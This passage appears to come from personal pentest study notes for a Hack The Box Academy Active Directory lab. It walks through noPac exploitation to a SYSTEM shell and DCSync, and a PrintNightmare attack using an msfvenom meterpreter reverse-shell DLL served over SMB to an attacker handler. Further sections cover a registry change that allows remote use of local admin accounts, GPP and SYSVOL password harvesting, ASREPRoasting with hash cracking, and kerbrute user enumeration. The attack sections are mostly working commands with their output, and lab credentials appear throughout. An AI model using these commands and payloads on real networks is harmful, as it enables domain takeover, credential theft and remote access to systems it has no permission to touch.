</span></span><span style=display:flex><span>â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ      
</span></span><span style=display:flex><span>â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      
</span></span><span style=display:flex><span>â–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
</span></span><span style=display:flex><span>                                               
</span></span><span style=display:flex><span>[*] Current ms-DS-MachineAccountQuota = 10
</span></span><span style=display:flex><span>[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>[*] will try to impersonat administrator
</span></span><span style=display:flex><span>[*] Adding Computer Account &#34;WIN-LWJFQMAXRVN$&#34;
</span></span><span style=display:flex><span>[*] MachineAccount &#34;WIN-LWJFQMAXRVN$&#34; password = &amp;A#x8X^5iLva
</span></span><span style=display:flex><span>[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &amp;A#x8X^5iLva.
</span></span><span style=display:flex><span>[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
</span></span><span style=display:flex><span>[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
</span></span><span style=display:flex><span>[*] Saving ticket in ACADEMY-EA-DC01.ccache
</span></span><span style=display:flex><span>[*] Resting the machine account to WIN-LWJFQMAXRVN$
</span></span><span style=display:flex><span>[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
</span></span><span style=display:flex><span>[*] Using TGT from cache
</span></span><span style=display:flex><span>[*] Impersonating administrator
</span></span><span style=display:flex><span>[*] 	Requesting S4U2self
</span></span><span style=display:flex><span>[*] Saving ticket in administrator.ccache
</span></span><span style=display:flex><span>[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>[*] Rename ccache with target ...
</span></span><span style=display:flex><span>[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
</span></span><span style=display:flex><span>[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
</span></span><span style=display:flex><span>[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
</span></span><span style=display:flex><span>[*] Exploiting..
</span></span><span style=display:flex><span>[!] Launching semi-interactive shell - Careful what you execute
</span></span><span style=display:flex><span>C:\Windows\system32&gt;
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=using-nopac-to-dcsync-the-built-in-administrator-account>Using noPac to DCSync the Built-in Administrator Account</h4><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h2 id=printnightmare>PrintNightmare</h2><p>Â </p><h4 id=cloning-the-exploit>Cloning the Exploit</h4><p>Bleeding Edge Vulnerabilities</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>pip3 uninstall impacket
</span></span><span style=display:flex><span>git clone https://github.com/cube0x0/impacket
</span></span><span style=display:flex><span>cd impacket
</span></span><span style=display:flex><span>python3 ./setup.py install
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=enumerating-for-ms-rprn>Enumerating for MS-RPRN</h4><p>Bleeding Edge Vulnerabilities</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
</span></span><span style=display:flex><span>Protocol: [MS-RPRN]: Print System Remote Protocol
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style=display:flex><span>[-] No arch selected, selecting arch: x64 from the payload
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Payload size: 510 bytes
</span></span><span style=display:flex><span>Final size of dll file: 8704 bytes
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=creating-a-share-with-smbserverpy>Creating a Share with smbserver.py</h4><p>Bleeding Edge Vulnerabilities</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span style=display:flex><span>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=configuring--starting-msf-multihandler>Configuring & Starting MSF multi/handler</h4><p>Bleeding Edge Vulnerabilities</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/handler
</span></span><span style=display:flex><span>[*] Using configured payload generic/shell_reverse_tcp
</span></span><span style=display:flex><span>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LHOST 172.16.5.225
</span></span><span style=display:flex><span>LHOST =&gt; 10.3.88.114
</span></span><span style=display:flex><span>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LPORT 8080
</span></span><span style=display:flex><span>LPORT =&gt; 8080
</span></span><span style=display:flex><span>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Started reverse TCP handler on 172.16.5.225:8080
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 &#39;\\172.16.5.225\CompData\backupscript.dll&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
</span></span><span style=display:flex><span>[+] Bind OK
</span></span><span style=display:flex><span>[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
</span></span><span style=display:flex><span>[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
</span></span><span style=display:flex><span>[*] Try 1...
</span></span><span style=display:flex><span>[*] Stage0: 0
</span></span><span style=display:flex><span>[*] Try 2...
</span></span><span style=display:flex><span>[*] Stage0: 0
</span></span><span style=display:flex><span>[*] Try 3...
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=miscellaneous-misconfigurations>Miscellaneous Misconfigurations</h1><h2 id=exchange-related-group-membership-and-organization-management>Exchange Related Group Membership and Organization Management</h2><p>Look out for this group these are cery powerfull</p><p>Â </p><p><strong>Organization Management&mdash;&mdash;->generic all on Exchange Windows Permissions&mdash;&mdash;->writedacl on domain</strong></p><p>Â </p><p>Â </p><p>Â </p><h2 id=printer-bug>Printer Bug</h2><p>can authenticate to any smb server just start ntlmrelayx and relay the hash to do stuff</p><h4 id=enumerating-for-ms-prn-printer-bug>Enumerating for MS-PRN Printer Bug</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\SecurityAssessment.ps1
PS C:\local&gt; Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True</code></pre></div><p>Â </p><p>Â </p><h2 id=ms14-068>MS14-068</h2><p>This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.</p><p>The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the <a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek rel=external>Python Kerberos Exploitation Kit (PyKEK)</a> or the Impacket toolkit. The only defense against this attack is patching. The machine <a href=https://app.hackthebox.com/machines/98 rel=external>Mantis</a> on the Hack The Box platform showcases this vulnerabilit</p><p>Â </p><h2 id=enumerating-dns-recordsactive-directory>Enumerating DNS Records(Active directory)</h2><h4 id=using-adidnsdump>Using adidnsdump</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>cube111@local[/local]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records</code></pre></div><p>Â </p><p>Â </p><h4 id=using-the--r-option-to-resolve-unknown-records>Using the -r Option to Resolve Unknown Records</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>cube111@local[/local]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records</code></pre></div><p>Â </p><p>Â </p><h4 id=viewing-the-contents-of-the-recordscsv-file>Viewing the Contents of the records.csv File</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ head records.csv 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>type,name,value
</span></span><span style=display:flex><span>?,LOGISTICS,?
</span></span><span style=display:flex><span>AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
</span></span><span style=display:flex><span>AAAA,ForestDnsZones,dead:beef::231
</span></span><span style=display:flex><span>A,ForestDnsZones,10.129.202.29
</span></span><span style=display:flex><span>A,ForestDnsZones,172.16.5.240
</span></span><span style=display:flex><span>A,ForestDnsZones,172.16.5.5
</span></span><span style=display:flex><span>AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
</span></span><span style=display:flex><span>AAAA,DomainDnsZones,dead:beef::231
</span></span><span style=display:flex><span>A,DomainDnsZones,10.129.202.29
</span></span></code></pre></div><p>Â </p><p><strong>UAC BYPASS</strong></p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>reg add &#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&#34; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

gpupdate /force
net stop server &amp;&amp; net start server</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h4 id=finding-passwords-in-the-description-field-using-get-domain-user>Finding Passwords in the Description Field using Get-Domain User</h4><p><a href=#R-image-f9a04d3dfd5ba42a6fd00136a042434b class=lightbox-link><img alt=80c56dd9b3443f261935e9bd7a5fe4bc.png class="lazy lightbox figure-image" loading=lazy src=../../resources/80c56dd9b3443f261935e9bd7a5fe4bc.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-f9a04d3dfd5ba42a6fd00136a042434b><img alt=80c56dd9b3443f261935e9bd7a5fe4bc.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/80c56dd9b3443f261935e9bd7a5fe4bc.png></a></p><p>Â </p><p>Â </p><h4 id=checking-for-passwd_notreqd-setting-using-get-domainuser>Checking for PASSWD_NOTREQD Setting using Get-DomainUser</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT</code></pre></div><p>Â </p><p>Â </p><h2 id=credentials-in-smb-shares-and-sysvol-scripts>Credentials in SMB Shares and SYSVOL Scripts</h2><h4 id=hecking-for-passwd_notreqd-setting-using-get-domainuser>hecking for PASSWD_NOTREQD Setting using Get-DomainUser</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT</code></pre></div><hr><h2 id=credentials-in-smb-shares-and-sysvol-scripts-1>Credentials in SMB Shares and SYSVOL Scripts</h2><p>The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named <code>reset_local_admin_pass.vbs</code>.</p><h4 id=discovering-an-interesting-script>Discovering an Interesting Script</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs</code></pre></div><p>Â </p><p>Â </p><h4 id=finding-a-password-in-the-script>Finding a Password in the Script</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = &#34;.&#34;
 
Set oShell = CreateObject(&#34;WScript.Shell&#34;) 
sUser = &#34;Administrator&#34;
sPwd = &#34;!ILFREIGHT_L0cALADmin!&#34;
 
Set Arg = WScript.Arguments
If  Arg.Count &gt; 0 Then
sPwd = Arg(0) &#39;Pass the password as parameter to the script
End if
 
&#39;Get the administrator name
Set objWMIService = GetObject(&#34;winmgmts:\\&#34; &amp; strComputer &amp; &#34;\root\cimv2&#34;)

&lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><h2 id=group-policy-preferences-gpp-passwords>Group Policy Preferences (GPP) Passwords</h2><p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p><ul><li>Map drives (drives.xml)</li><li>Create local users</li><li>Create printer config files (printers.xml)</li><li>Creating and updating services (services.xml)</li><li>Creating scheduled tasks (scheduledtasks.xml)</li><li>Changing local admin passwords.</li></ul><p><a href=#R-image-a255a2bf9b5594eedd088f8682cd4b1b class=lightbox-link><img alt=6f6be7495b5fea5775dea5be12fe61aa.png class="lazy lightbox figure-image" loading=lazy src=../../resources/6f6be7495b5fea5775dea5be12fe61aa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-a255a2bf9b5594eedd088f8682cd4b1b><img alt=6f6be7495b5fea5775dea5be12fe61aa.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/6f6be7495b5fea5775dea5be12fe61aa.png></a></p><p>Â </p><p>Â </p><h4 id=decrypting-the-password-with-gpp-decrypt>Decrypting the Password with gpp-decrypt</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password1
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>ube111@local[/local]$ crackmapexec smb -L | grep gpp
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
</span></span><span style=display:flex><span>[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
</span></span></code></pre></div><h4 id=using-crackmapexecs-gpp_autologin-module>Using CrackMapExec&rsquo;s gpp_autologin Module</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
</span></span><span style=display:flex><span>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
</span></span><span style=display:flex><span>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
</span></span><span style=display:flex><span>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Polic
</span></span></code></pre></div><p>Â </p><p>Â </p><h2 id=asreproasting>ASREPRoasting</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>S C:\local&gt; Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</code></pre></div><p>Â </p><p>Â </p><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path &#39;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#39; for &#39;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))&#39;
[*] SamAccountName         : mmorgan</code></pre></div><p>Â </p><p>Â </p><h4 id=cracking-the-hash-offline-with-hashcat>Cracking the Hash Offline with Hashcat</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>hashcat (v6.1.1) starting...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
</span></span><span style=display:flex><span>                                                 
</span></span><span style=display:flex><span>Session..........: hashcat
</span></span><span style=display:flex><span>Status...........: Cracked
</span></span><span style=display:flex><span>Hash.Name........: Kerberos 5, etype 23, AS-REP
</span></span><span style=display:flex><span>Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
</span></span><span style=display:flex><span>Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
</span></span><span style=display:flex><span>Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
</span></span><span style=display:flex><span>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
</span></span><span style=display:flex><span>Guess.Queue......: 1/1 (100.00%)
</span></span><span style=display:flex><span>Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loop
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=retrieving-the-as-rep-using-kerbrute>Retrieving the AS-REP Using Kerbrute</h4><p>Miscellaneous Misconfigurations</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    __             __               __     
</span></span><span style=display:flex><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style=display:flex><span>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
</span></span><span style=display:flex><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style=display:flex><span>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/04/01 13:14:17 &gt;  Using KDC(s):
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  	172.16.5.5:88
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jwilson@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 bdavis@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 njohnson@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 asanchez@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 dlewis@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 ccruz@inlanefreight.local
</span></span><span style=display:flex><span>2022/04/01 13:14:17 &gt;  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
